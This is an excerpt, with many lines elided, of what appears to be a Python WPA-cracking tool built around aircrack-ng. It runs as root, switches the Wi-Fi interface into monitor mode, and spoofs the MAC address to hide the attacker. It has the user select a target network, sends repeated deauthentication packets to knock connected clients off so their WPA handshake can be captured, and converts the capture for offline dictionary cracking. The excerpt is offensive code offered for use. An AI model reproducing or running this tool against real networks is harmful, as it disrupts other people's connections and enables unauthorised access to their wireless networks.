...
def ConfirmRunningAsRoot():
    if os.getuid() != 0:
        print(color(" {!} {O}ERROR: {G}" + basename + "{W} must be run as {R}root{W}"))
        exit(1)

def ConfirmCorrectPlatform():
    if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:
        print(color(" {!} {O}WARNING: {G}" + basename + "{W} must be run on {O}linux{W}"))
        exit(1)
...
class Wpa_Attack:
    ...
    def initial_check(self):
        ...
        for air in airs:
            if program_exists(air):
                continue
            print(color(" {!} {O}required program not found: {R}" + air + "{W}"))
            print(color(" {!} {O}this program is bundled with the aircrack-ng suite:{W}"))
    ...
    def build_opt_parser(self):
        ...
        argparser.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', 
            action='store',dest='dic')
        argparser.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
        argparser.add_argument('--mac', help='Anonymize MAC address.', 
            action='store_true', default=False,dest='mac_anon')
        argparser.add_argument('-mac', help=argparse.SUPPRESS,
            action='store_true', default=False, dest='mac_anon')
        argparser.add_argument('-c', help='Channel to scan for targets.', 
            ...
            if options.dic:
                try:
                    ...
                    if os.path.exists(options.dic):
                        print(color(" {+} WPA dictionary set to {G}%s{W}"%(self.WPA_DICTIONARY)))
                    else:
                        print(color(" {!} {O}WPA dictionary file not found:{R}%s{W}"%(options.dic)))
            if options.channel:
                try:
                    self.channel = int(options.channel)
                except ValueError:
                    print(color(" {!} {O}invalid channel: {C}" + options.channel + "{W}"))
                except IndexError:
                    print(color(" {!} {O}no channel given!{W}"))
                else:
                    print(color(" {+} channel set to {G}%s{W}"%(str(self.channel))))
            if options.mac_anon:
                print(color(" {+} mac address anonymizing {G}enabled{W}"))
                print(color("{O}     not only works if device is not already in monitor mode!{W}"))
    ...
    def mac_anonymize(self):
        ...
        proc = run(['ifconfig', self.iface], stdout=PIPE, stderr=DEVNULL, encoding='utf-8')
        ...
        if self.origin_mac:
            ...
            sys.stdout.write(color(" {+} changing {G}%s{W}'s MAC from {P}%s{W} to {C}%s{W}..."
    ...
    def mac_change_back(self):
        ...
        sys.stdout.write(color(" {+} changing {G}%s{W}'s mac back to {C}%s{W}..."
    ...
    def start_monitor_mode(self):
        ...
        if proc.stdout.find(b'Mode:Monitor')==-1:
            self.mac_anonymize()
            run(['airmon-ng','start',self.iface],stdout=DEVNULL,stderr=DEVNULL)
            print(color(" {!} Start Wireless interface Monitor mode: {O}" + self.iface + "{W}"))
        proc = run(['iwconfig'],stdout=PIPE,stderr=DEVNULL,encoding='utf-8')
        if 'Mode:Monitor' not in proc.stdout:
            print(color( "{!} {O}" + self.iface + 
    ...
    def stop_monitor_mode(self):
        proc = run(['airmon-ng','stop',self.iface_monitor],stdout=DEVNULL,stderr=DEVNULL)
        if proc.returncode==0:
            print(color(" {!} Stop Wireless interface Monitor mode: {O}" +
    ...
    def get_iface(self):
        ...
        if len(ifaces)>1:
            print(color(" {+} Found {G}"+str(len(ifaces))+"{W} wireless devices..."))
            sys.stdout.write(color(" {+} "))
            for num,iface in enumerate(ifaces):
                sys.stdout.write(color("{G}" + str(num+1) + "{GR}:{C}" + iface + "{W}\t"))
            sys.stdout.flush()
            print('')
            try:
                while not self.iface:
                    ri=input(color(" {+} Please select the wireless number {G} [1-%s] {W}: "
                        %(len(ifaces))))
            ...
            print(color(" {!} {O}you need to plug in a wifi device or install drivers.{W}"))
            exit(1)
        ...
        try:
            ...
            try:
                while not self.target_bssid:
                    ri = input(color(" {+} Please select target {O}BSSID{W} to crack :"))
    ...
    def has_handshake(self, capfile):
        ...
        proc_crack = run(crack, stdout=PIPE, stderr=DEVNULL, shell=True, encoding='utf-8')
    ...
    def wpa_get_handshake(self):
        ...
        try:
            ...
            print(color(" {GR}%s{W} starting {G}wpa handshake capture{W} on {C}%s{W}" % 
            ...
            while not self.got_handshake and seconds_running < self.WPA_ATTACK_TIMEOUT:
                ...
                print("                                                          \r",end='')
                print(color(" {GR}%s{W} listening for handshake...\r" % 
                    (sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running))),end='')
                sys.stdout.flush()
                if seconds_since_last_deauth > self.WPA_DEAUTH_TIMEOUT:
                    ...
                    if clients:
                        for client in clients:
                            ...
                            proc_deauth = Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
                            proc_deauth.wait()
                            print(color(" {GR}%s{W} sending {G}%s{W} deauth to {C}%s{W}...\r" % 
                                (sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running), 
                                 str(self.WPA_DEAUTH_COUNT), client)),end='')
                            sys.stdout.flush()
                    else:
                        print(color(" {GR}%s{W} sending {G}%s{W} deauth to {O}*broadcast*{W}...      \r" 
                            % (sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running),
                            str(self.WPA_DEAUTH_COUNT))),end='')
                        sys.stdout.flush()
                        time.sleep(1)
                if self.has_handshake(temp_cap_file):
                    self.got_handshake = True
            if not self.got_handshake:
                print(color(" {R}[00:00:00]{O} unable to capture handshake in time{W}"))
                self.stop_monitor_mode()
            else:
                proc.send_signal(SIGINT)
                proc_deauth.send_signal(SIGINT)
                ...
                if os.path.exists(cap2hccapx):
                    try:
                        run([cap2hccapx,cap_file,cap_file[:-3]+'hccapx'],stdout=DEVNULL,stderr=DEVNULL)
                    except:pass
                self.stop_monitor_mode()
                if self.WPA_DICTIONARY == '':
                    print(color(" {!} {O}No WPA dictionary found! use -dict <file> command-line argument{W}"))
                else:
